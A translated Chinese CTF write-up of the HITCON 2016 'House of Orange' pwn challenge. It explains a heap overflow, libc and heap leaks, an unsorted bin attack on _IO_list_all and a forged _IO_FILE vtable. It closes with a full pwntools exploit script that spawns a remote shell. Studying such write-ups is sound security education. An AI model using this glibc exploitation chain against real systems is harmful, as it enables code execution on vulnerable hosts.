> 原文链接: https://www.anquanke.com//post/id/84965 


# 【CTF攻略】CTF Pwn之创造奇迹的Top Chunk


                                阅读量   
                                **230645**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](https://p1.ssl.qhimg.com/t013d1f070c3329d621.jpg)](https://p1.ssl.qhimg.com/t013d1f070c3329d621.jpg)**

****

**翻译：**[**hac425**](http://bobao.360.cn/member/contribute?uid=2553709124)

**稿费：160RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**



**概述**

这是一道 HITCON CTF Qual 2016 的pwn500的题.利用方式很独特故分享之。

程序链接: [https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/house-of-orange-500](https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/house-of-orange-500)

<br>

**了解程序**

首先看看程序运行时的界面:

                            

[![](https://p5.ssl.qhimg.com/t01e96d7ddb68479fd5.png)](https://p5.ssl.qhimg.com/t01e96d7ddb68479fd5.png)

下面对每个功能进行解释。

**Build the house**

1. 创建一个房子,房子中可以选择所放置的桔子的颜色

2. 在这个过程中会创建两个结构体,这里把他们分别命名为 orange和house,之后分配了一个name缓冲区.

结构体用c描述为



```
struct orange`{`
  int price ;
  int color ;
`}`;
struct house `{`
  struct orange *org;
  char *name ;
`}`;
```

3. 只能创建四次房子。

**See the house**

显示房子的信息。

**Upgrade the house**

1. 更新房子的信息

2. 可以修改房子的名字和桔子的信息

3. 只能修改3次

**Give up **

退出程序

<br>

**漏洞**

**1. 堆溢出**

当我们修改房子的名称时，程序没有对名字的大小进行检查,导致了一个堆溢出。下面是触发漏洞伪代码：



```
printf("Length of name :");
size = read_int();
if(size &gt; 0x1000)`{`
    size = 0x1000;
`}`
printf("Name:");
read_input(cur_house-&gt;name,size);
printf("Price of Orange: ");
cur_house-&gt;org-&gt;price = read_int();
```

**2. 信息泄露**

程序使用read()函数来读取信息导致了一个信息泄露。

```
void read_input(char *buf,unsigned int size)`{`
    int ret ;
    ret = read(0,buf,size);
    if(ret &lt;= 0)`{`
        puts("read error");
        _exit(1);
    `}`
`}`
```

<br>

**利用漏洞**

**思路**

1. [失败]使用堆溢出去重写top chunk的大小,把他的大小调到很大.接着使用house of force技术来重写name指针.但是程序使用的是无符号整形而且size的大小小于0x1000,所以这种思路行不通.

2. [失败]使用堆溢出重写name指针,但是这里程序只使用了malloc函数.所以这种思路也行不通.

3. [成功]我们通过使用 位于 sysmalloc中的 _int_free来创建一个free chunk,然后使用unsorted bin attack来重写libc中的_IO_list_all 结构体,进而控制程序的流程.

**重写top chunk的大小**

我们想使用sysmalloc的_int_free,因此我们要做的第一步就是通过使用堆溢出漏洞来重写top chunk的大小来触发sysmalloc.

触发sysmalloc: 如果top chunk的大小不够大的话.系统会使用 sysmalloc来分配一块新的内存区域.这样一来就会增加原来堆的大小或者mmap一块新的内存.我们需要malloc一个大小小于mmp_.mmap_threshold的内存来扩大那个旧的堆.

在sysmalloc中触发_init_free:为了在sysmalloc中触发_init_free,我们需要将top chunk的大小设为大于 MINSIZE(0X10)的数值.主要的问题是在sysmalloc()中还有两个 assert 来进行校验.因此我们还需要伪造一个符和逻辑的top chunk来绕过他们.为了绕过这些assert,size值有以下的一些限制.

1.大于MINSIZE(0X10)

2.小于所需的大小 + MINSIZE

3.prev inuse位设置为1

4.old_top + oldsize要在一个页中.

[![](https://p4.ssl.qhimg.com/t013b69b31ea5cce980.png)](https://p4.ssl.qhimg.com/t013b69b31ea5cce980.png)

举个例子.假设top chunk的地址位于 0x6030d0 并且他的大小为0x20f31,我们就应该重写他的大小为0xf31来绕过那些assert,然后我们申请一个比较大的chunk来触发sysmalloc和 _int_free.最后我们就能在堆中得到一个 unsorted bin chunk.

                            

[![](https://p0.ssl.qhimg.com/t01bed578d70ed0d818.png)](https://p0.ssl.qhimg.com/t01bed578d70ed0d818.png)

**信息泄露**

通过上一步我们已经在堆中创建了一个unsorted bin chunk,我们就可以通过他来泄露libc和堆的地址.

泄露libc的地址:我们首先新建一间新的house,其大小设为一个比较大的值但同时还要小于我们刚刚设置top chunk的大小,通过这种方式来拿到刚才那个unsorted bin chunk.接下来我们可以输入8个字节作为house的name,j接着在使用 See the house 功能我们就能拿到libc的地址.由于malloc函数不会清理位于堆中的值,所以我们才能得到libc的地址.

泄露堆的地址:因为这里已经没有任何一个chunk可以匹配unsorted bin的大小了,所以他会被作为第一个large bin.这里有两个成员需要注意: fd_nextsize 和 bk_nextsize,在large chunk中上述两个成员位于的位置的值为两个指针.分别指向下一个和前一个large chunk..我们可以在修改 house信息时利用它来泄露堆的地址.

**在malloc中止过程中劫持程序执行流**

当glibc检测到一些内存崩溃问题时,他会进入到Abort routine(中止过程),他会把所有的streams送到第一阶段中(stage one).换句话说就是,他会进入_IO_flush_all_lockp函数,并会使用_IO_FILE对象,而_IO_FILE对象会在_IO_list_all中被调用.如果我们能够重写这些指针并且伪造那个对象,那么我们就能拿到程序的控制权了.因为_IO_FILE 会使用一个名为_IO_jump_t的虚函数表来调用一些函数,所以这也是一个伪造的点.虚表的结构大致为

[![](https://p0.ssl.qhimg.com/t0182142e26c76e12ef.png)](https://p0.ssl.qhimg.com/t0182142e26c76e12ef.png)

下面是当glibc检测到内存崩溃时处理的大致流程.

                                                

[![](https://p5.ssl.qhimg.com/t012fa6814498331783.png)](https://p5.ssl.qhimg.com/t012fa6814498331783.png)

所以我们现在要做的就是伪造_IO_FILE对象,伪造_IO_FILE对象的目的是为了在触发_IO_flush_all_lockp时程序能去调用 _IO_OVERFLOW对应的函数,所以我们的伪造还需要遵循一定的限制条件.具体如下:

```
0841       if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
0842 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
0843        || (_IO_vtable_offset (fp) == 0
0844            &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
0845                     &gt; fp-&gt;_wide_data-&gt;_IO_write_base))
0846 #endif
0847        )
0848       &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
```

在_IO_FILE对象的最后还有一个虚表,我们可以在堆中伪造一个.

当我们申请一块堆内存时,系统首先会在unsorted bin中处理.不管位于unsorted bin中的chunk的大小是否匹配他都会把chunk给移除下来,在这一过程中他并没有检测那个链表的完整性.在unsorted chunk被从unsorted bin移除前,我们还可以实现 一些内存写 : bk = addr – 0x10, addr =  addr_of_unsorted_bin  (bk为unsorted chunk的bk指针,addr为任意地址, addr_of_unsorted_bin为 unsorted bin的地址.).最后我们决定使用这种技巧来用 unsorted bin 的地址来重写_IO_list_all.

                                          [![](https://p3.ssl.qhimg.com/t0156e0fd7c08ff91e2.png)](https://p3.ssl.qhimg.com/t0156e0fd7c08ff91e2.png)

目前我们还是不能控制程序的执行流,原因在于我们还不能控制main_arena中的内容,我们决定使用一个执行下一个 _IO_FILE 对象的指针.他是位于 main_arena中的一个 small bin中.我们可以通过使用 upgrade 函数来重写 unsorted chunk的大小来控制他的内容,与此同时我们再伪造一个_IO_FILE 对象.之后我们使用 build 函数来触发一个unsorted bin attack 攻击重写 _IO_list_all.最后,他会触发一个 unsorted bin chunk的分配接着系统会检测到 malloc函数内部的一些内存错误,而此时我们已经控制了  _IO_list_all ,所以我们现在已经可以干任何事了.大致的伪造流如下

                                

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014c77a267954f08c7.png)

测试截图

[![](https://p3.ssl.qhimg.com/t0176190f014c33aceb.png)](https://p3.ssl.qhimg.com/t0176190f014c33aceb.png)

**exploit: **

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
# Author : Angelboy
# http://blog.angelboy.tw
host = "52.68.192.99"
port = 56746
r = remote(host,port)
def build(size,name,price,color):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(price))
    r.recvuntil(":")
    r.sendline(str(color))
def see():
    r.recvuntil(":")
    r.sendline("2")
    data = r.recvuntil("+++++++++++++++++++++++++++++++++++++")
    return data
def upgrade(size,name,price,color):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(price))
    r.recvuntil(":")
    r.sendline(str(color))
build(0x80,"ddaa",199,2)
payload = "a"*0x90
payload += p32(0xdada) + p32(0x20) + p64(0)
payload += p64(0) + p64(0xf31) # forge top size
upgrade(0xb1,payload,123,3) # overwrite the size of top
build(0x1000,"qqqqq",199,1) # trigger the _int_free in sysmalloc
build(0x400,"aaaaaaa",199,2) # create a large chunk and Leak the address of libc
data = see().split("Price")[0].split()[-1].ljust(8,"x00")
libcptr =  u64(data)
libc = libcptr - 0x3c4188
print "libc:",hex(libc)
upgrade(0x400,"c"*16,245,1) # Leak the address of heap
data = ("x00" +see().split("Price")[0].split()[-1]).ljust(8,"x00")
heapptr = u64(data)
heap = heapptr - 0x100
print "heap:",hex(heap)
io_list_all = libc + 0x3c4520
system = libc + 0x45380
vtable_addr = heap + 0x728-0xd0
payload = "b"*0x410
payload += p32(0xdada) + p32(0x20) + p64(0)
stream = "/bin/shx00" + p64(0x61) # fake file stream
stream += p64(0xddaa) + p64(io_list_all-0x10) # Unsortbin attack
stream = stream.ljust(0xa0,"x00")
stream += p64(heap+0x700-0xd0)
stream = stream.ljust(0xc0,"x00")
stream += p64(1)
payload += stream
payload += p64(0)
payload += p64(0)
payload += p64(vtable_addr)
payload += p64(1)
payload += p64(2)
payload += p64(3) 
payload += p64(0)*3 # vtable
payload += p64(system)
upgrade(0x800,payload,123,3)
r.recvuntil(":")
r.sendline("1") # trigger malloc and abort
r.interactive()
```

<br>

**总结**



通过一个堆溢出覆盖top chunk的size字段后,在利用 unsorted chunk attack攻击 _IO_FILE对象,最终实现代码执行,这整个过程确实精妙.也可以看出作者对linux的堆管理机制应该是十分的了解.所以我们在研究一些东西时一定要研究透彻,只有这样才能想到别人想不到的思路.

<br>

**参考来源**

[http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html](http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html)

[http://www.bitscn.com/network/hack/200607/30235.html](http://www.bitscn.com/network/hack/200607/30235.html)

[https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/house-of-orange-500](https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/house-of-orange-500)


